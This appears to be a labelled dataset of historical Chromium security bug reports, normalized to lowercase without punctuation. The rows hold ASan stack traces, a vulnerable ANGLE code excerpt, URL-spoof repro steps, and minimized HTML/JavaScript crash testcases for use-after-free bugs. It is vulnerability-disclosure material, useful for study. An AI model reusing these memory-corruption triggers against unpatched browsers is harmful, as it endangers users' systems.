chrome_57be0000 webcore node node d src\chrome\src\third_party\webkit\source\core\dom\node.cpp 412 048cfe54 5b1c45c2 chrome_57be0000 webcore containernode removedetachedchildren d src\chrome\src\third_party\webkit\source\core\dom\containernode.cpp 81 048cfe58 5b18f928 chrome_57be0000 webcore document dispose d src\chrome\src\third_party\webkit\source\core\dom\document.cpp 638 048cfe5c 59a453a2 chrome_57be0000 v8 internal globalhandles node postgarbagecollectionprocessing d src\chrome\src\v8\src\global-handles.cc 268 048cfe60 59a456b8 chrome_57be0000 v8 internal globalhandles postgarbagecollectionprocessing d src\chrome\src\v8\src\global-handles.cc 660 048cfe64 59a42110 chrome_57be0000 v8 internal heap performgarbagecollection d src\chrome\src\v8\src\heap.cc 986 048cfe68 59a42ad7 chrome_57be0000 v8 internal heap collectgarbage d src\chrome\src\v8\src\heap.cc 662 048cfe6c 59a43255 chrome_57be0000 v8 internal heap collectallgarbage d src\chrome\src\v8\src\heap.cc 571 048cfe70 59a43f0f chrome_57be0000 v8 internal heap idlenotification d src\chrome\src\v8\src\heap.cc 5810 048cfe74 59a11b4d chrome_57be0000 v8 internal v8 idlenotification d src\chrome\src\v8\src\v8.cc 196 048cfe78 5aa16888 chrome_57be0000 webcore v8gcforcontextdispose pseudoidletimerfired d src\chrome\src\third_party\webkit\source\bindings\v8\v8gcforcontextdispose.cpp 74 048cfe7c 595736cc chrome_57be0000 base timer runscheduledtask d src\chrome\src\base\timer.cc 181 048cfe80 59572dc7 chrome_57be0000 base basetimertaskinternal run d src\chrome\src\base\timer.cc 47 048cfe84 57bf8359 chrome_57be0000 base messageloop runtask d src\chrome\src\base\message_loop.cc 486 048cfe88 57bf9b85 chrome_57be0000 base messageloop dodelayedwork d src\chrome\src\base\message_loop.cc 726 048cfe8c 57c25a69 chrome_57be0000 base messagepumpdefault run d src\chrome\src\base\message_pump_default.cc 33 048cfe90 57bfa3eb chrome_57be0000 base messageloop runinternal d src\chrome\src\base\message_loop.cc 441 048cfe94 57c17d40 chrome_57be0000 base runloop run d src\chrome\src\base\run_loop.cc 46 048cfe98 5949c9e0 chrome_57be0000 content renderermain d src\chrome\src\content\renderer\renderer_main.cc 236 048cfe9c 5873373f chrome_57be0000 content runnamedprocesstypemain d src\chrome\src\content\app\content_main_runner.cc 433 048cfea0 5873394d chrome_57be0000 content contentmainrunnerimpl run d src\chrome\src\content\app\content_main_runner.cc 756 048cfea4 5872fe00 chrome_57be0000 content contentmain d src\chrome\src\content\app\content_main.cc 35 048cfea8 57be1020 chrome_57be0000 chromemain d src\chrome\src\chrome\app\chrome_main.cc 28 a minimized test case is attached	11
heap-use-after-free in webcore node setneedsstylerecalc detailed report uploader wfh chromium.org crash type heap-use-after-free read 4 crash address crash state crash stack webcore node setneedsstylerecalc webcore datetimefieldelement defaulteventhandler free stack wtf hashmap wtf refptr webcore element unsigned int wtf ptrhash wtf refptr webcore element webcore useractionelementset clearflags regressed minimized testcase 1.37 kb	11
heap-use-after-free in webcore basemultiplefieldsdateandtimeinputtype destroyshadowsubtree detailed report uploader inferno chromium.org crash type heap-use-after-free write 1 crash address crash state crash stack webcore basemultiplefieldsdateandtimeinputtype destroyshadowsubtree webcore htmlinputelement updatetype free stack webcore htmlinputelement updatetype webcore htmlinputelement parseattribute	11
security use-after-free in radioinputtype handlekeydownevent void radioinputtype handlekeydownevent keyboardevent event basecheckableinputtype handlekeydownevent event if event defaulthandled return const string key event keyidentifier if key up key down key left key right return left and up mean previous radio button right and down mean next radio button tested in winie and even for rtl left still means previous radio button and so moves to the right seems strange but we ll match it however when using spatial navigation we need to be able to navigate without changing the selection document document element document if isspatialnavigationenabled document frame return bool forward key down key right we can only stay within the form s children if the form has n't been demoted to a leaf because of malformed html node node element while node forward nodetraversal next node nodetraversal previous node notice the weak iteration pattern once we encounter a form element we know we re through if node hastagname formtag break look for more radio buttons if node hastagname inputtag continue htmlinputelement inputelement tohtmlinputelement node if inputelement form element form break if inputelement isradiobutton inputelement name element name inputelement isfocusable document setfocusednode inputelement notice that this line fires the focus event synchronously inputelement dispatchsimulatedclick event sendnoevents donotshowpressedlook there s no longer anyone keeping inputelement alive at this point event setdefaulthandled return bool document setfocusednode passrefptr node prpnewfocusednode focusdirection direction set focus on the new node m_focusednode newfocusednode you might thing that document holds a reference to inputelement via m_focusednode dispatch the focus event and let the node do any other focus related activities important for text fields m_focusednode dispatchfocusevent oldfocusednode direction but this code fires the focus synchronously if m_focusednode newfocusednode handler shifted focus focuschangeblocked true goto setfocusednodedone which can end up kicking inputelement out of m_focusednode	11
heap-use-after-free in webcore applystylecommand removeinlinestyle detailed report fuzzer inferno_twister crash type heap-use-after-free read 8 crash address crash state crash stack webcore applystylecommand removeinlinestyle webcore applystylecommand applyinlinestyle free stack webcore applystylecommand removeinlinestyle webcore applystylecommand applyinlinestyle minimized testcase 0.77 kb download body id=tcf1 h6 id=tcf11 title em id=tcf75 b b iframe id=tcf105 onload if window.testrunner amp window.internals if document.counter document.counter else document.counter 1 if document.counter 16 document.designmode='on document.execcommand selectall document.execcommand italic document.execcommand removeformat document.body.innerhtml='pass style='test-align right x title h6 style kvisibility hidden font italic small-caps 10pt helvetica style script function initcf settimeout cfcrash 135 document.addeventlistener domcontentloaded initcf false function editfuzz function cfcrash try tcf11.innerhtml tcf1.textcontent catch e script	11
tracking bug for internal security fixes for chrome 28 release 1 see the bug list below	11
assertion failed obj isrenderinline obj this unknown in webcore renderblock createlineboxes detailed report fuzzer bj_broddelwerk crash type unknown crash address crash state crash stack webcore renderblock createlineboxes webcore renderblock constructline webcore renderblock createlineboxesfrombidiruns minimized testcase 0.20 kb download style text-decoration inherit webkit-column-count:120 display list-item class3 cursor webkit-grab list-style-position inside style head body class class3 rt button kbd button	11
heap-use-after-free in webcore v8gccontroller opaquerootforgc detailed report fuzzer inferno_twister crash type heap-use-after-free read 4 crash address crash state crash stack webcore v8gccontroller opaquerootforgc webcore v8cssstylesheet opaquerootforgc free stack v8 internal globalhandles node postgarbagecollectionprocessing v8 internal globalhandles postgarbagecollectionprocessing regressed minimized testcase 6.70 kb	11
security angle libglesv2 integer overflow description almost native graphics layer engine angle library integer overflow versions affected google chrome 27.0.1453.116 m category memory corruption reporter alex chapman of context information security summary the almost native graphics layer engine angle library as used in google chrome is vulnerable to an integer overflow vulnerability leading to memory corruption which may allow an attacker to exploit the browser process the angle library is used by chrome on windows as a bridge between the opengl es 2.0 api and directx note as this is a bug in the angle library a bug report has also been submitted to mozilla analysis the issue occurs due to insufficient bounds checking prior to integer multiplication within the context drawlineloop function libglesv2/context.cpp const int spaceneeded count 1 sizeof unsigned int if mlineloopib mlineloopib new streamingindexbuffer mdevice initial_index_buffer_size d3dfmt_index32 if mlineloopib mlineloopib reservespace spaceneeded gl_unsigned_int uint offset 0 unsigned int data static_cast unsigned int mlineloopib map spaceneeded offset startindex offset 4 if data switch type case gl_none non-indexed draw for int i 0 i count i data i i data count 0 break the count variable is directly controlled from javascript with no validation performed by the angle library context drawlineloop proceeds to request a buffer using the overflowed spaceneeded variable as the size and fill the insufficiently allocated memory with data resulting in a heap overflow condition the crash occurs within the renderer gpu-process sad tab crash example crash information from chrome 27.0.1453.116 m 1d48.1614 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=04015000 ebx=7fffffff ecx=002e2c00 edx=00000000 esi=053fa7a8 edi=00000000 eip=6fb8103c esp=0024e8ac ebp=0024e8bc iopl=0 nv up ei ng nz ac po cy cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010293 libglesv2 ordinal147 6fb8103c 890c88 mov dword ptr eax+ecx 4 ecx ds:002b:04ba0000=52455343 childebp retaddr args to child warning stack unwind information not available following frames may be wrong 0024e8bc 6fb827b5 00000000 00000000 00000000 libglesv2 ordinal147 0024e8e8 6fb6c03c 7ffffffe 00000000 7fffffff libglesv2 ordinal147 0024e924 6252486f 00000002 00000000 7fffffff libglesv2 gldrawarrays 0024e968 62524922 6338d5d0 00000000 00000002 chrome_61100000 gpu gles2 gles2decoderimpl dodrawarrays c b\build\slave\win\build\src\gpu\command_buffer\service\gles2_cmd_decoder.cc 6245 0024e988 6252a218 00000000 064108c8 00000232 chrome_61100000 gpu gles2 gles2decoderimpl handledrawarrays c b\build\slave\win\build\src\gpu\command_buffer\service\gles2_cmd_decoder.cc 6271 0024ea84 6252e1fa 00000134 00000003 064108c8 chrome_61100000 gpu gles2 gles2decoderimpl docommand c b\build\slave\win\build\src\gpu\command_buffer\service\gles2_cmd_decoder.cc 3592 0024eab0 6251256a 00000000 0545b688 05455600 chrome_61100000 gpu commandparser processcommand c b\build\slave\win\build\src\gpu\command_buffer\service\cmd_parser.cc 72 0024ed14 62513a85 05461d40 6367b8d3 0024ed64 chrome_61100000 gpu gpuscheduler putchanged c b\build\slave\win\build\src\gpu\command_buffer\service\gpu_scheduler.cc 78 0024ed24 624a81af 00000243 00b0e0c0 05455604 chrome_61100000 gpu commandbufferservice flush c b\build\slave\win\build\src\gpu\command_buffer\service\command_buffer_service.cc 92 0024ed64 6280b19e 00000243 00000019 00000243 chrome_61100000 content gpucommandbufferstub onasyncflush c b\build\slave\win\build\src\content\common\gpu\gpu_command_buffer_stub.cc 669 0024ed7c 624a9f46 00b0e0c0 05455600 05455600 chrome_61100000 filesystemhostmsg_cancelwrite dispatch content fileapimessagefilter content fileapimessagefilter void thiscall content fileapimessagefilter int int c b\build\slave\win\build\src\content\common\fileapi\file_system_messages.h 138 0024eee8 611f0adc 01b0e0c0 00b0e0c0 0024ef34 chrome_61100000 content gpucommandbufferstub onmessagereceived c b\build\slave\win\build\src\content\common\gpu\gpu_command_buffer_stub.cc 187 0024eef8 624a461e 00b0e0c0 768fd383 00a6c250 chrome_61100000 content messagerouter routemessage c b\build\slave\win\build\src\content\common\message_router.cc 50 0024ef34 61331af6 0024f5d8 0024ef54 613319a7 chrome_61100000 content gpuchannel handlemessage c b\build\slave\win\build\src\content\common\gpu\gpu_channel.cc 799 0024ef40 613319a7 624a4571 00000000 00a6c250 chrome_61100000 base internal invokehelper 1 void base internal runnableadapter void thiscall chrometomobileservice void void cdecl base weakptr chrometomobileservice const makeitso c b\build\slave\win\build\src\base\bind_internal.h 883 0024ef54 6113425b 00a6c240 0024f5d8 00a6c244 chrome_61100000 base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall chrometomobileservice void void cdecl chrometomobileservice void cdecl base weakptr chrometomobileservice void cdecl chrometomobileservice run c b\build\slave\win\build\src\base\bind_internal.h 1173 0024efe8 61133c5e 0024f5d8 0024f010 00a1fe70 chrome_61100000 messageloop runtask c b\build\slave\win\build\src\base\message_loop.cc 478 in addition to the above issue a bug in the nvidia graphics driver version information in gfx_driver_version.txt and insufficient validation of the size of allocated memory returned by a call to idirect3ddevice9 createindexbuffer in streamingindexbuffer reservespace libglesv2/indexdatamanager.cpp can also trigger a similar heap overflow condition with the buggy nvidia driver calls to idirect3ddevice9 createindexbuffer with large memory sizes e.g fail to allocate the requested amount of memory but return a success result hresult 0 subsequent code in streamingindexbuffer reservespace does not check the size of memory allocated before returning the buffer to the context drawlineloop function libglesv2/context.cpp to be used context drawlineloop proceeds to fill the insufficiently allocated memory with data assuming a successful memory allocation resulting in a heap overflow condition example crash information from chrome 27.0.1453.116 m 21d8.1b44 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=044aa000 ebx=3fffc000 ecx=002c5800 edx=00000000 esi=034d2fc8 edi=00000000 eip=6e35103c esp=002ce46c ebp=002ce47c iopl=0 nv up ei ng nz na pe cy cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010287 libglesv2 ordinal147 6e35103c 890c88 mov dword ptr eax+ecx 4 ecx ds:002b:04fc0000=52455343 childebp retaddr args to child warning stack unwind information not available following frames may be wrong 002ce47c 6e3527b5 00000000 00000000 00000000 libglesv2 ordinal147 002ce4a8 6e33c03c 3fffbfff 00000000 3fffc000 libglesv2 ordinal147 002ce4e4 650f486f 00000002 00000000 3fffc000 libglesv2 gldrawarrays 002ce528 650f4922 65f5d5d0 00000000 00000002 chrome_63cd0000 gpu gles2 gles2decoderimpl dodrawarrays c b\build\slave\win\build\src\gpu\command_buffer\service\gles2_cmd_decoder.cc 6245 002ce548 650fa218 00000000 066808c8 00000232 chrome_63cd0000 gpu gles2 gles2decoderimpl handledrawarrays c b\build\slave\win\build\src\gpu\command_buffer\service\gles2_cmd_decoder.cc 6271 002ce644 650fe1fa 00000134 00000003 066808c8 chrome_63cd0000 gpu gles2 gles2decoderimpl docommand c b\build\slave\win\build\src\gpu\command_buffer\service\gles2_cmd_decoder.cc 3592 002ce670 650e256a 00000000 02663e08 0266b000 chrome_63cd0000 gpu commandparser processcommand c b\build\slave\win\build\src\gpu\command_buffer\service\cmd_parser.cc 72 002ce8d4 650e3a85 0274e7e0 6624b8d3 002ce924 chrome_63cd0000 gpu gpuscheduler putchanged c b\build\slave\win\build\src\gpu\command_buffer\service\gpu_scheduler.cc 78 002ce8e4 650781af 00000243 0274e9c0 0266b004 chrome_63cd0000 gpu commandbufferservice flush c b\build\slave\win\build\src\gpu\command_buffer\service\command_buffer_service.cc 92 002ce924 653db19e 00000243 00000019 00000243 chrome_63cd0000 content gpucommandbufferstub onasyncflush c b\build\slave\win\build\src\content\common\gpu\gpu_command_buffer_stub.cc 669 002ce93c 65079f46 0274e9c0 0266b000 0266b000 chrome_63cd0000 filesystemhostmsg_cancelwrite dispatch content fileapimessagefilter content fileapimessagefilter void thiscall content fileapimessagefilter int int c b\build\slave\win\build\src\content\common\fileapi\file_system_messages.h 138 002ceaa8 63dc0adc 0174e9c0 0274e9c0 002ceaf4 chrome_63cd0000 content gpucommandbufferstub onmessagereceived c b\build\slave\win\build\src\content\common\gpu\gpu_command_buffer_stub.cc 187 002ceab8 6507461e 0274e9c0 768fd383 0274e010 chrome_63cd0000 content messagerouter routemessage c b\build\slave\win\build\src\content\common\message_router.cc 50 002ceaf4 63f01af6 002cf1a0 002ceb14 63f019a7 chrome_63cd0000 content gpuchannel handlemessage c b\build\slave\win\build\src\content\common\gpu\gpu_channel.cc 799 002ceb00 63f019a7 65074571 00000000 0274e010 chrome_63cd0000 base internal invokehelper 1 void base internal runnableadapter void thiscall chrometomobileservice void void cdecl base weakptr chrometomobileservice const makeitso c b\build\slave\win\build\src\base\bind_internal.h 883 002ceb14 63d0425b 0274e000 002cf1a0 0274e004 chrome_63cd0000 base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall chrometomobileservice void void cdecl chrometomobileservice void cdecl base weakptr chrometomobileservice void cdecl chrometomobileservice run c b\build\slave\win\build\src\base\bind_internal.h 1173 002ceba8 63d03c5e 002cf1a0 002cebd0 0265fe70 chrome_63cd0000 messageloop runtask c b\build\slave\win\build\src\base\message_loop.cc 478 these bugs have been tested on windows 7 and 8.1 x64 proof of concept enclosed in the zip file is a html file which triggers the interger overflow and subsequent heap corruption on affected browser versions on windows systems expected result of running angle_crash.html no crash actual result of running angle_crash.html access violation code c0000005 with heap corrupted	7
heap-use-after-free in xsltapplysequenceconstructor vulnerability details the attached testcase crashes the asan build of chrome asan-symbolized-linux-release-211418 the stack backtrace and testcase indicate an issue with object tags being created while xsl is evaluated version chrome version asan build 211418 operating system linux 64-bit reproduction case the attached zip file contains several files loading the crash.html in chrome will lead to the crash it is a little unreliable and might require several attempts reloading the page does not work to make it more reliable maybe an issue with caching for crashes please include the following additional information type of crash tab crash state asan output attached	11
heap-use-after-free in content webmediaplayerimpl paint vulnerability details the attached testcase crashes the asan build of chrome seems like a vector is ruleset vector is reallocated a reference to the old vector might still exist version chrome version asan-symbolized-linux-release-211418 operating system linux 64-bit reproduction case the testcase is attached as a zip file as it requires multiple files loading crash.html will crash the browser tab for crashes please include the following additional information type of crash tab crash state asan output attached in crash.log	11
heap-use-after-free in webcore timerbase start vulnerability details the attached test case crashes chrome s asan build javascript gc has to be enabled a document element is freed and used again during finishedloading version chrome version asan-symbolized-linux-release-211418 operating system linux 64bit reproduction case the testcase is attached in a zip file as it requires multiple files crash.html will trigger the crash for crashes please include the following additional information type of crash tab crash state see attached crash.log for asan output	11
security chrome shared memory file can be world readable and lacks security checks when opening existing mappings initially seen in it looks like sharedmemory create and the subsequently called functions do n't do anything about the user s default umask files seem to be created with that umask any temporary file should be only readable to the current user	2
heap-use-after-free in webcore hrtfelevation calculatekernelsforazimuthelevation detailed report fuzzer attekett_webaudio_fuzzer job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack wtf hashtableaddresult wtf hashtableiterator wtf string wtf keyvaluepair wtf string wtf refp webcore hrtfelevation calculatekernelsforazimuthelevation free stack wtf hashtableaddresult wtf hashtableiterator wtf string wtf keyvaluepair wtf string wtf refp webcore hrtfelevation calculatekernelsforazimuthelevation fully reproducible crash found using linux_tsan_chrome_mp job type history_size=6	11
heap-use-after-free in webcore audiodspkernelprocessor reset detailed report fuzzer attekett_webaudio_fuzzer job type windows_syzyasan_chrome crash type use-after-free read 4 crash address crash state crash stack webcore audiodspkernelprocessor reset webcore biquadprocessor settype free stack webcore biquaddspkernel scalar deleting destructor wtf vector wtf ownptr webcore frameaction 0 shrink minimized testcase 74.37 kb	11
heap-use-after-free in content webaudiosourceproviderimpl provideinput detailed report fuzzer attekett_webaudio_fuzzer job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack content webaudiosourceproviderimpl provideinput webkit webmediaplayerclientimpl audiosourceproviderimpl provideinput free stack content webaudiosourceproviderimpl webaudiosourceproviderimpl non-virtual thunk to content webaudiosourceproviderimpl webaudiosourceproviderimpl fully reproducible crash found using linux_tsan_chrome_mp job type history_size=6	11
heap-use-after-free in webcore reverb latencyframes detailed report fuzzer attekett_webaudio_fuzzer crash type heap-use-after-free read 8 crash address crash state crash stack webcore reverb latencyframes webcore convolvernode latencytime free stack webcore convolvernode setbuffer v8 internal storecallbackproperty unminimized testcase additional requirements requires interaction gestures	11
heap-use-after-free in webcore convolvernode tailtime detailed report fuzzer attekett_webaudio_fuzzer job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore convolvernode tailtime webcore audionode propagatessilence free stack webcore convolvernode setbuffer webcore convolvernodev8internal bufferattributesettercallback fully reproducible crash found using linux_tsan_chrome_mp job type history_size=6	11
security url spoof with http status 204 vulnerability details it is possible to display url of a page which returns http status 204 on address bar while displaying contents of another origin but it is not possible to spoof https indicators version chrome version 29.0.1547.32 beta 30.0.1580.0 214109 trunk operating system ubuntu 12.04 reproduction case prerequisite need a web server which supports php like apache otherwise it is necessary to change 204.php 1 download and copy repro1.html and 204.php to the root folder of local web server 2 open chrome with this host-resolver-rules flag chrome host-resolver-rules map chamalabc.com 127.0.0.1 3 open repro1.html with this url 4 click visit chamalabc.com link 5 chrome will open a new tab url of new tab is but content from 127.0.0.1 is displayed for crashes please include the following additional information type of crash not a crash	11
heap-use-after-free in webcore renderblock determinestartposition tested on os windows 7 x64 chrome 30.0.1569.1 official build 212521 canary syzyasan chromium 30.0.1582.0 developer build 214332 i only managed to get syzyasan-trace from chrome canary which is little outdated in chromium i get sad tab but i m unable to analyse the crash any further atm i have n't tried this on asan-build yet syzyasan-trace syzyasan error heap-use-after-free on address stack_id read of size 4 at 0 in unknown 1 in unknown 2 in unknown 3 in unknown 4 in unknown 5 in unknown analysis from minidump bad access information alloc_stack 62 alloc_stack_size alloc_tid free_stack 62 free_stack_size free_tid 2 error_type 0 unknown_bad_access access_mode 4 no matching name access_size shadow_info 128 b21b is 3 bytes inside 60-byte block 0494b218,0494b254 microseconds_since_free 00000000 crash stack chrome_dll webcore numberofisolateancestors fpo non-fpo conv cdecl chrome_dll webcore renderblock determinestartposition fpo non-fpo conv thiscall chrome_dll webcore renderblock layoutrunsandfloats fpo non-fpo conv thiscall allocation stack chrome_dll malloc chrome_dll webcore text createtextrenderer chrome_dll webcore noderenderingcontext createrendererfortextifneeded chrome_dll webcore text attach chrome_dll webcore insert chrome_dll webcore htmlconstructionsite inserttextnode chrome_dll webcore htmltreebuilder processcharacterbufferforinbody chrome_dll webcore htmltreebuilder processcharacterbuffer chrome_dll webcore htmltreebuilder processcharacter chrome_dll webcore htmltreebuilder processtoken chrome_dll webcore htmltreebuilder constructtree chrome_dll webcore htmldocumentparser pumppendingspeculations chrome_dll webcore htmldocumentparser didreceiveparsedchunkfrombackgroundparser chrome_dll wtf functionwrapper void thiscall webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator chrome_dll wtf boundfunctionimpl wtf functionwrapper void thiscall webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk void cdecl wtf w eakptr webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator chrome_dll base internal invoker 1 base internal bindstate base internal runnableadapter bool cdecl void bool cdecl void void cdecl void bool cdecl void run chrome_dll base messageloop runtask chrome_dll base messageloop dowork chrome_dll base messagepumpdefault run chrome_dll base messageloop runinternal chrome_dll base runloop run chrome_dll base messageloop run chrome_dll content renderermain chrome_dll content runnamedprocesstypemain chrome_dll content contentmainrunnerimpl run chrome_dll content contentmain chrome_dll chromemain free stack chrome_dll malloc chrome_dll webcore text createtextrenderer chrome_dll webcore noderenderingcontext createrendererfortextifneeded chrome_dll webcore text attach chrome_dll webcore insert chrome_dll webcore htmlconstructionsite inserttextnode chrome_dll webcore htmltreebuilder processcharacterbufferforinbody chrome_dll webcore htmltreebuilder processcharacterbuffer chrome_dll webcore htmltreebuilder processcharacter chrome_dll webcore htmltreebuilder processtoken chrome_dll webcore htmltreebuilder constructtree chrome_dll webcore htmldocumentparser pumppendingspeculations chrome_dll webcore htmldocumentparser didreceiveparsedchunkfrombackgroundparser chrome_dll wtf functionwrapper void thiscall webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator chrome_dll wtf boundfunctionimpl wtf functionwrapper void thiscall webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk void cdecl wtf w eakptr webcore htmldocumentparser wtf passownptr webcore htmldocumentparser parsedchunk operator chrome_dll base internal invoker 1 base internal bindstate base internal runnableadapter bool cdecl void bool cdecl void void cdecl void bool cdecl void run chrome_dll base messageloop runtask chrome_dll base messageloop dowork chrome_dll base messagepumpdefault run chrome_dll base messageloop runinternal chrome_dll base runloop run chrome_dll base messageloop run chrome_dll content renderermain chrome_dll content runnamedprocesstypemain chrome_dll content contentmainrunnerimpl run chrome_dll content contentmain chrome_dll chromemain	11
heap-use-after-free in webcore renderblock determinestartposition tested on os ubuntu 12.04 chromium asan 31.0.1612.0 developer build 219526 i think this issue is related to issue 265838 at least the stack trace looks similar repro-file as attachment asan-report 5017==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in webcore isisolatedinline webcore renderobject b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/inlineiterator.h:414:0 1 in webcore numberofisolateancestors webcore inlineiterator const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/inlineiterator.h:440:13 2 in webcore renderblock determinestartposition webcore linelayoutstate webcore bidiresolver webcore inlineiterator webcore bidirun b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderblocklinelayout.cpp:2338:36 3 in webcore renderblock layoutrunsandfloats webcore linelayoutstate bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderblocklinelayout.cpp:1549:0 4 in webcore renderblock layoutinlinechildren bool webcore layoutunit webcore layoutunit b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderblocklinelayout.cpp:2173:0 5 in webcore renderblock layoutblock bool webcore layoutunit b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:1596:0 is located 0 bytes inside of 96-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl 1 in detach b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/node.cpp:1127 2 in removebetween b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernode.cpp:508 3 in removechild b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernode.cpp:492 4 in removechild b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/node.cpp:537 5 in removechildmethodcustom b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/bindings/v8/custom/v8nodecustom.cpp:104 6 in removechildmethodcallbackformainworld b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/v8node.cpp:684	11
heap-use-after-free in webkitofflineaudiocontext vulnerability details heap-use-after-free in webkitofflineaudiocontext the test case below also triggers null-dereference crashes which seems to be depending on when the event function triggered also observed similar crashes using createbuffersource version chrome version asan chrome build 213035 215570 216226 operating system ubuntu 13.04 reproduction case head script choose math.floor math.random 2 if choose==0 c1 new webkitofflineaudiocontext 1 44100 0.5 44100 o1 c1.createoscillator o1.connect c1.destination o1.onended function o1.start 0 o1.stop 0.1 c1.startrendering settimeout document.location.href=document.url 1000 script head body for crashes please include the following additional information 28634==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in ref b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/eventtarget.h:101 1 in notifyended b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/modules/webaudio/audioscheduledsourcenode.cpp:194 2 in makeitso b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:871 3 in runtask b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:478 4 in deferorrunpendingtask b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:490 5 in dowork b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:604 6 in run b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_pump_default.cc:32 7 in runinternal b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:432 8 in run b/build/slave/asan_release__symbolized_/build/src/out/release base/run_loop.cc:45 9 in run b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:303 10 in renderermain b/build/slave/asan_release__symbolized_/build/src/out/release content/renderer/renderer_main.cc:242 11 in runzygote b/build/slave/asan_release__symbolized_/build/src/out/release content/app/content_main_runner.cc:391 12 in runnamedprocesstypemain b/build/slave/asan_release__symbolized_/build/src/out/release content/app/content_main_runner.cc:451 13 in run b/build/slave/asan_release__symbolized_/build/src/out/release content/app/content_main_runner.cc:763 14 in contentmain b/build/slave/asan_release__symbolized_/build/src/out/release content/app/content_main.cc:35 15 in chromemain b/build/slave/asan_release__symbolized_/build/src/out/release chrome/app/chrome_main.cc:32 16 in main b/build/slave/asan_release__symbolized_/build/src/out/release chrome/app/chrome_exe_main_gtk.cc:43 17 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 18 in start 0 is located 0 bytes inside of 328-byte region freed by thread t0 chrome here 0 in operator delete asan_rtl 1 in deletemarkednodes b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/modules/webaudio/audiocontext.cpp:825 2 in deref b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/modules/webaudio/audionode.cpp:466 3 in postgarbagecollectionprocessing b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/global-handles.cc:263 4 in postgarbagecollectionprocessing b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/global-handles.cc:918 5 in performgarbagecollection b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/heap.cc:1012 6 in collectgarbage b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/heap.cc:687 7 in collectgarbage b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/heap-inl.h:507 8 in collectallgarbage b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/heap.cc:594 9 in idlenotification b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/heap.cc:5948 10 in idlenotification b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/v8.cc:196 11 in idlenotification b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/api.cc:5472 12 in pseudoidletimerfired b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/bindings/v8/v8gcforcontextdispose.cpp:74 13 in sharedtimerfiredinternal b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/platform/threadtimers.cpp:134 14 in sharedtimerfired b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/platform/threadtimers.cpp:108 15 in makeitso b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:871 16 in run b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:1169 17 in runscheduledtask b/build/slave/asan_release__symbolized_/build/src/out/release base/timer/timer.cc:181 18 in makeitso b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:871 19 in run b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:1169 20 in runtask b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:478 21 in deferorrunpendingtask b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:490 22 in dowork b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:604 23 in run b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_pump_default.cc:32 24 in runinternal b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:432 25 in run b/build/slave/asan_release__symbolized_/build/src/out/release base/run_loop.cc:45 26 in run b/build/slave/asan_release__symbolized_/build/src/out/release 